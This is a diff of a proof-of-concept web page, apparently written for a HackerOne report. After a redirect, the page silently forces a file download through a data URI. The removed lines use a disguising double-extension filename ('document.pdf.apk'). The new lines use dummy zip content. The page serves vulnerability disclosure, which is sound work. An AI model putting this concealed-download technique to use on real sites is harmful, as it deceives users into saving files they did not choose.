@@ -1,5 +1,5 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Concealed Download</title>
@@ -32,18 +32,18 @@ document.addEventListener('click', () => {
   // Step 1: Redirect to HackerOne first
   location.href = 'https://hackerone.com'; 
 
-  // Step 2: Trigger file download after 3 seconds (since redirect happens immediately)
+  // Step 2: After 3 seconds, trigger file download
   setTimeout(() => {
-    // Create "legitimate" file content (e.g., a PDF-like string, image data)
-    const payload = `%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Test PDF) /Author (Your Name) >>\nendobj\n...`; 
+    // Create "legitimate" file content (e.g., a dummy file content for download)
+    const payload = 'This is some dummy content for the zip file.';
 
-    // Create a Data URI for the content (this does not expose an external URL)
-    const dataUri = `data:application/pdf;base64,${btoa(payload)}`;
+    // Create a Data URI for the content (this will be treated as a text file for download)
+    const dataUri = `data:application/zip;base64,${btoa(payload)}`;
 
     // Create an <a> tag to trigger the download
     const a = document.createElement('a');
     a.href = dataUri;
-    a.download = 'document.pdf.apk'; // Suggested filename to make it look legitimate
+    a.download = 'document.zip'; // Suggested filename (ZIP file)
     document.body.appendChild(a);
     a.click(); // Trigger the download
 
